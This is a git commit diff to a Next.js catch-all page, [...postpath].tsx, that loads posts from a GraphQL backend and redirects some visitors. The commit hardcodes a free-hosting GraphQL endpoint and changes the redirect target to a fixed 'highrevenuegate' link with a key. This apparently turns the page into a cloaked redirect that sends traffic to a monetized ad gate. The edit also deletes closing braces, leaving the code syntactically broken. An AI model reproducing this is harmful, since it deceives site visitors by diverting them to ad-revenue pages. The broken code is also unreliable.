cc407110d689d71877c42aa21576bc913ed39bc1
Irfan2500866 <134538123+Irfan2500866@users.noreply.github.com>
2023-05-24 23:57:09 +0500

    Update [...postpath].tsx

--- pages/[...postpath].tsx
+++ pages/[...postpath].tsx
@@ -4,7 +4,7 @@ import { GetServerSideProps } from 'next';
 import { GraphQLClient, gql } from 'graphql-request';
 
 export const getServerSideProps: GetServerSideProps = async (ctx) => {
-	const endpoint = process.env.GRAPHQL_ENDPOINT as string;
+	const endpoint = "https://irfan03131183927.000webhostapp.com/graphql"
 	const graphQLClient = new GraphQLClient(endpoint);
 	const referringURL = ctx.req.headers?.referer || null;
 	const pathArr = ctx.query.postpath as Array<string>;
@@ -19,9 +19,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					`https://saveourstateok.org/` + encodeURI(path as string)
-				}`,
-			},
+					`https://www.highrevenuegate.com/bkcrexg30?key=a7c7e8ea164ad249fab5ffc86c0773a2/`
 		};
 		}
 	const query = gql`
